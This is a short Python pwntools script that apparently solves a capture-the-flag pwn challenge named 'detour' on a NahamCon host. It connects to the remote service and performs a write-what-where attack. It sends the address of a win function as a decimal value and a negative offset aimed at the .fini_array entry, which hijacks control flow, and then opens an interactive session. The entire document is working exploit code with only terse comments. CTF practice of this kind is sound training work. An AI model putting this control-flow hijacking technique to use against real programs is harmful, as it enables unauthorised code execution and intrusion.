#!/usr/bin python3

from pwn import *

# remote connection
r = remote('challenge.nahamcon.com', 30033)
# local connection
# r = process('./detour')
win_addr = 0x401209
detours_fini_array = 0x4031C8
base = 0x403430
v5_0 = detours_fini_array - base

# recv "What: "
r.recvuntil(b'What: ')
# send byte code
r.sendline(b'4198921')

r.recvuntil(b"Where: ")
# construct v5_0 as a long int

r.sendline(b"-616")

r.interactive()


